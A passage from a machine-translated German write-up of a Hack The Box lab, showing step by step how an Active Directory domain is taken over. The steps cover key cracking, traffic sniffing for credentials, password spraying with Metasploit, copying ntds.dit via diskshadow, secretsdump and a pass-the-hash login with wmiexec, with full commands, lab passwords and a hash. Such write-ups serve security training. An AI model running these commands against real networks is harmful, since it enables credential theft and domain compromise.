Beim Herstellen einer Verbindung wird ein Fehler angezeigt, der durch Angabe der Option für das Client-Min-Protokoll behoben werden kann.</font></font><br>
<br>
<pre><code class="bash hljs">sudo proxychains smbclient //172.16.249.201/Citrix$ -U htb.local\\mturner%4install! --option=<span class="hljs-string">'client min protocol=NT1'</span> 2&gt;/dev/null</code></pre><br>
<img src="https://habrastorage.org/webt/vn/yi/bh/vnyibhq9ui9jd9-smv92jserdqg.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Und übergebe die Flagge.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/zy/o3/uy/zyo3uyt0kbvkkijgwr_vdwnaa5i.png"><br>
<br>
<img src="https://habrastorage.org/webt/js/y2/pp/jsy2ppljrcwqjfvit23y4pzisig.png"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Tarnflagge</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Lassen Sie uns den privaten Putty-Schlüssel herausfinden. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/u9/kg/z-/u9kgz-0fzwj3uftpn1yjzumc5qa.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dieser private Schlüssel ist verschlüsselt und für die SSH-Autorisierung ausgelegt. </font><font style="vertical-align: inherit;">Lassen Sie uns das Passwort durchgehen, mit dem der Schlüssel entschlüsselt wurde. </font><font style="vertical-align: inherit;">Formatieren Sie dazu zunächst den Schlüssel zum John-Format neu. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ui/-y/rw/ui-yrwxnm9mh_b-_p7ae2lbkbtc.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Das Durchsuchen von Standardwörterbüchern funktionierte jedoch nicht und veranlasste mich zu einem hervorragenden Tool zum Generieren von „bequem eingegebenen“ Passwörtern - </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kwprocessor</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font><font style="vertical-align: inherit;">Lassen Sie uns ein Wörterbuch erstellen.</font></font><br>
<br>
<pre><code class="bash hljs">./kwp -o key-dict.txt basechars/tiny.base keymaps/en.keymap routes/2-to-32-max-5-direction-changes.route</code></pre><br>
<img src="https://habrastorage.org/webt/xe/mz/j0/xemzj0okpereyu2ubrjiz7u7esi.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Und wir haben das 16-stellige Passwort erfolgreich gefunden.</font></font><br>
<br>
<pre><code class="bash hljs">john --wordlist=./kwprocessor/key-dict.txt putty.john</code></pre><br>
<img src="https://habrastorage.org/webt/0v/08/p9/0v08p94zn_xex3wgqvqh55ahqyy.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Da ich Linux habe, ist es für mich bequemer, mit einem normalen SSH-Client zu arbeiten. </font><font style="vertical-align: inherit;">Formatieren Sie den Schlüssel für dieses Format neu.</font></font><br>
<br>
<pre><code class="bash hljs">sudo apt install putty-tools<font></font>
puttygen private.ppk -O private-openssh -o id_rsa</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Jetzt entscheiden wir, wo wir mit ihm hinkommen können. </font><font style="vertical-align: inherit;">Scannte dazu das interne Netzwerk, um den offenen Port 22 zu finden.</font></font><br>
<br>
<pre><code class="bash hljs">proxychains nmap -p22 172.16.249.200-205 2&gt;/dev/null</code></pre><br>
<img src="https://habrastorage.org/webt/fq/da/78/fqda78yhbo1nuezb5_txvnxvigg.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Und wir finden, aber wir wissen immer noch nichts über diesen Gastgeber. Beim Versuch, eine Verbindung ohne Namen herzustellen, erhalten wir eine interessante Nachricht und eine Passwortanfrage. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/sf/gp/qs/sfgpqst6ffsugdv0biquhni5fea.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Die Prüfung der Namen der uns bekannten Benutzer brachte keine Ergebnisse. Das Scannen der nmap dieses Dienstes mit Skripten ergab ebenfalls nichts. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/sd/wi/y0/sdwiy0egqd4zgm4fagjeyizfmv4.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dann habe ich alle Ports auf dem Host gescannt. Er wartete jedoch nicht auf das Ende des Scans, da es sehr lange dauerte, da man in den Proxychain-Informationen beobachten konnte, ob der Port verfügbar ist oder nicht. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/yv/9e/ov/yv9eovdujflhzyyf9q-hsg7uphw.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Da Port 80 verfügbar war, habe ich einen Proxy in meinem Browser installiert und nachgesehen, was sich dort befindet. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/v2/e6/v-/v2e6v-zekaxpfyu5pvagxkayeta.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Wir werden von der Citrix NetScaler-Autorisierungsseite empfangen. Und Google bringt uns zu der Dokumentation, in der wir das Standard-Login erkennen. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/mh/cp/ha/mhcpha-tvjml8kvelevudpehacs.png"><br>
<br>
<img src="https://habrastorage.org/webt/u4/rg/zi/u4rgziapmiadlxkt9v-cnydmizo.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Und mit diesem Login verbinden wir uns erfolgreich über SSH.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/u2/kl/5b/u2kl5b92xjdgz1gfigbyvb8jgfs.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Nachdem ich auf dem Server herumgewandert war, habe ich mir Materialien zu Angriffen auf diese Art von Ausrüstung angesehen, von denen eine die Verkehrsüberwachung ist. </font><font style="vertical-align: inherit;">Daher habe ich tcpdump für eine Weile aktiv gelassen und einen Traffic Dump erhalten.</font></font><br>
<br>
<pre><code class="bash hljs">tcpdump -s0 -w r.pcap</code></pre><br>
<img src="https://habrastorage.org/webt/ur/9p/pf/ur9ppf0umalf7govd7ao_jjzc-q.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Laden Sie jetzt diese Datei herunter.</font></font><br>
<br>
<pre><code class="bash hljs">proxychains scp -i id_rsa nsroot@172.16.249.202:/root/r.pcap ./</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Und um schnell Anmeldeinformationen zu finden, verwenden wir </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PCredz</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font></font><br>
<br>
<img src="https://habrastorage.org/webt/0c/lq/yn/0clqyngcfi_fxwg1onbheg9t6au.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Und wir bekommen noch eine Flagge.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/ub/ws/mx/ubwsmxhyscpsrfy7jumcjf689la.png"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Doppelgänger Flagge</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Da dieses Programm jedoch überhaupt nicht angezeigt wird, müssen Sie den Speicherauszug auf das Vorhandensein verschiedener Geheimnisse oder Token analysieren. </font><font style="vertical-align: inherit;">Nachdem wir die Pakete nach Protokoll sortiert haben, gelangen wir zu LDAP und finden die bindRequest von zwei Benutzern, die ein Passwort haben (wir haben bereits eines gefunden). </font></font><br>
<br>
<img src="https://habrastorage.org/webt/il/ad/7_/ilad7_p_f-rbgwdrpglcejkbh74.png"><br>
<br>
<img src="https://habrastorage.org/webt/_6/w_/al/_6w_al3oddm4ikipiqi3ishgado.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Überprüfen Sie dieses Passwort für diesen Benutzer.</font></font><br>
<br>
<pre><code class="bash hljs">proxychains cme smb -u <span class="hljs-string">"netscaler-svc"</span> -p <span class="hljs-string">"#S3rvice#@cc"</span> -d htb.local 172.16.249.200 2&gt;/dev/null</code></pre><br>
<img src="https://habrastorage.org/webt/n_/7x/r4/n_7xr4urfsbuwry9m258zxmiczy.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dieser Benutzer ist nicht bemerkenswert, außer dass er ein Benutzer des Dienstes ist. </font><font style="vertical-align: inherit;">Oft stimmen die Passwörter solcher Benutzer mit den Passwörtern anderer Benutzer der Domäne überein. </font><font style="vertical-align: inherit;">Lassen Sie uns überprüfen, welche anderen Benutzer dieses Passwort verwenden. </font><font style="vertical-align: inherit;">Ich habe das mit Metasploit gemacht.</font></font><br>
<br>
<pre><code class="bash hljs">proxychains msfconsole 2&gt;/dev/null<font></font>
&gt; use auxiliary/scanner/smb/smb_login<font></font>
&gt; <span class="hljs-built_in">set</span> SMBDomain htb.local<font></font>
&gt; <span class="hljs-built_in">set</span> RHOSTS 172.16.249.200<font></font>
&gt; <span class="hljs-built_in">set</span> USER_FILE ~/tmp/users.txt<font></font>
&gt; <span class="hljs-built_in">set</span> PASS_FILE ~/tmp/passwords.txt<font></font>
&gt; <span class="hljs-built_in">set</span> VERBOSE <span class="hljs-literal">false</span>
&gt; run</code></pre><br>
<img src="https://habrastorage.org/webt/8l/d5/gj/8ld5gjri_mmvptxg1-cdlzc9f1e.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Und dieses Passwort ging an alle Dienstkonten. </font><font style="vertical-align: inherit;">Wie bereits erwähnt, ist das Backup-SVC-Konto privilegiert. Dies bedeutet, dass es sich beim Domänencontroller anmelden darf. </font><font style="vertical-align: inherit;">Überprüfen Sie die offenen Ports der Dienste RDP (3389) und WinRM (5985).</font></font><br>
<br>
<pre><code class="bash hljs">proxychains nmap -p 3389,5985 172.16.249.200 2&gt;/dev/null</code></pre><br>
<img src="https://habrastorage.org/webt/pz/cw/5a/pzcw5asa6eqyodh4sfwa6vc9_ys.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Beide Anmeldemethoden sind möglich, aber ich bevorzuge WinRM. </font><font style="vertical-align: inherit;">Melden Sie sich mit dem Evil-WinRM-Programm an.</font></font><br>
<br>
<pre><code class="bash hljs">proxychains evil-winrm -i 172.16.249.200 -u backup-svc -p <span class="hljs-string">"#S3rvice#@cc"</span> 2&gt;/dev/null</code></pre><br>
<img src="https://habrastorage.org/webt/lq/nx/rg/lqnxrg12wpdnbcsr9fuapynu38u.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Und nimm noch eine Flagge.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/5c/eu/xx/5ceuxxnpsuj3orc_35qazfwnkq0.png"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Eigene Flagge</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Nachdem wir uns die Informationen zu diesem Benutzer angesehen haben, sehen wir seine Mitgliedschaft in privilegierten Gruppen, sodass wir die Datei ntds.dit kopieren und die Anmeldeinformationen der Domänenbenutzer extrahieren können.</font></font><br>
<br>
<pre><code class="bash hljs">whoami /all</code></pre><br>
<img src="https://habrastorage.org/webt/in/4i/a6/in4ia6lepmr0u2_voqct6h-qjw8.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Von den Dump-Methoden der ntds-Datei wird die Option discshadow erfolgreich ausgeführt. </font><font style="vertical-align: inherit;">Melden wir uns mit RDP an. </font><font style="vertical-align: inherit;">Als Kunde benutze ich Remmina.</font></font><br>
<br>
<pre><code class="bash hljs">proxychains remmina</code></pre><br>
<img src="https://habrastorage.org/webt/1b/bv/os/1bbvosxjg1jb6y7acri98kmj47k.png"><br>
<br>
<img src="https://habrastorage.org/webt/so/ec/79/soec79bjwbiktiqfc9udby8v4g0.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Und wir werden von einem Eingabeaufforderungsfenster begrüßt. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/xl/ox/kr/xloxkreweosxvmhp56wiy4v4hms.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Gehen wir in den Kontext von Diskshadow. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/nw/uh/ub/nwuhub-n7hnrfsm9q505cyrvrt4.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Und erstellen Sie ein Kopierlaufwerk Z.</font></font><br>
<br>
<pre><code class="bash hljs"><span class="hljs-built_in">set</span> context persistence nowriters<font></font>
add volume c: <span class="hljs-built_in">alias</span> sss<font></font>
create <font></font>
expose %sss% z:</code></pre><br>
<img src="https://habrastorage.org/webt/ow/hv/xx/owhvxxddfioicyx-kn1frars-hs.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Überprüfen Sie eine Kopie der Datei ntds.dit. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/hp/vo/ei/hpvoeilgbsxim5ljt3nxflbmo6w.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Wir benötigen auch eine Systemdatei, um die ntds-Datenbank zu entschlüsseln, aber es ist einfacher, sie abzurufen.</font></font><br>
<br>
<pre><code class="bash hljs">reg.exe save hklm\system C:\Users\backup-svc\Documents\system.bak</code></pre><br>
<img src="https://habrastorage.org/webt/nz/_z/16/nz_z16rrzirc0l4udjlgvny5zvm.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dies ist jedoch noch nicht alles, da die ntds-Datei nicht umsonst kopiert werden kann. </font><font style="vertical-align: inherit;">Verwenden Sie dazu das </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">folgende Tool</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font><font style="vertical-align: inherit;">Laden Sie zunächst beide DLLs auf den Host. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/z9/jb/d1/z9jbd1lsunkcyd3uon6v8yl3skw.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Und in den Speicher laden. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/9q/gk/cj/9qgkcjotiqguv2rhtjbci6ey1-0.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Jetzt aktivieren wir das Privileg und überprüfen, ob es sich im Status Aktiviert befindet.</font></font><br>
<br>
<pre><code class="bash hljs">Set-SeBackupPrivilege<font></font>
Whoami /priv | findstr Backup</code></pre><br>
<img src="https://habrastorage.org/webt/uu/bt/gt/uubtgtsp7zzfuvc9jyi-371bte8.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ok, jetzt kopiere die Datei.</font></font><br>
<br>
<pre><code class="bash hljs">Copy-FileSeBackupPrivilege z:\windows\ntds\ntds.dit C:\Users\backup-svc\Documents\ntds.dit</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Und jetzt laden wir die ntds- und Systemdateien auf den lokalen Host herunter ( </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">und in diesem Moment wird das Labor geschlossen und ich verliere den Zugriff, während ich die Dateien herunterlade ... Es stellte sich heraus, dass das Labor nur Benutzern mit einem Abonnement zur Verfügung stand (wurde neu aufgelöst) und ich kann die Passage nicht beenden Vielen Dank an @kemstat für die Freigabe der VPN-Konfiguration für die Dauer des VIP, damit ich diese Passage beenden kann</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font><font style="vertical-align: inherit;">Lassen Sie uns die Anmeldeinformationen erhalten.</font></font><br>
<br>
<pre><code class="bash hljs">secretsdump.py -ntds ndts.dit -system system.bak LOCAL</code></pre><br>
<img src="https://habrastorage.org/webt/pk/jc/vt/pkjcvt3bnlmlqet3kcbewyy72ks.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Und es gibt einen Admin-Hash. </font><font style="vertical-align: inherit;">Verwenden Sie jetzt den PTH-Angriff, um eine Verbindung zum Server herzustellen. </font><font style="vertical-align: inherit;">Psexec (Verbindung über SMB) verhindert jedoch, dass wir die Datei lesen können. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/tz/c8/wp/tzc8wpvaac_btlyw3sq5mie2b1y.png"><br>
<br>
<img src="https://habrastorage.org/webt/-_/mq/jj/-_mqjjz_ybfor9th1np8b6liibs.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
WMI gewährt uns jedoch uneingeschränkten Zugriff und wir erhalten die Berechtigungen des Domänenadministrators und das letzte Flag.</font></font><br>
<br>
<pre><code class="bash hljs">proxychains wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:822601ccd7155f47cd955b94af1558be Administrator@172.16.249.200 2&gt;/dev/null</code></pre><br>
<img src="https://habrastorage.org/webt/ba/y_/sd/bay_sddavamcgwmwy2hj-i819eg.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Das ist alles. </font><font style="vertical-align: inherit;">Kommentieren Sie als Feedback, ob Sie aus diesem Artikel etwas Neues gelernt haben und ob es für Sie nützlich war. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sie können sich uns </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">per Telegramm anschließen</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font><font style="vertical-align: inherit;">Dort finden Sie interessante Materialien, zusammengeführte Kurse sowie Software. </font><font style="vertical-align: inherit;">Stellen wir eine Community zusammen, in der es Menschen gibt, die sich in vielen Bereichen der IT auskennen. Dann können wir uns in Fragen der IT und der Informationssicherheit immer gegenseitig helfen.</font></font></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../de506954/index.html">Ein weiterer Artikel über Rails und ELK</a></li>
<li><a href="../de506956/index.html">Quantentechnologie und Gesundheit</a></li>
<li><a href="../de506962/index.html">Async / warte in Unity</a></li>
<li><a href="../de506964/index.html">Android-Entwicklung: Karrierebericht für Mai 2020</a></li>
<li><a href="../de506976/index.html">Übersicht über die 3D-Scanner Solutionix D500 und D700</a></li>
<li><a href="../en486014/index.html">SLAC Tour: US Department of Energy National Accelerator Laboratory at Stanford</a></li>
<li><a href="../en486018/index.html">Session Survey Results</a></li>
<li><a href="../en486024/index.html">Really simple graphics in R for science and journalism</a></li>
<li><a href="../en486028/index.html">Neural networks in the production of dentures</a></li>
<li><a href="../en486030/index.html">TL-SREET 55 5K LED Street Light Review</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>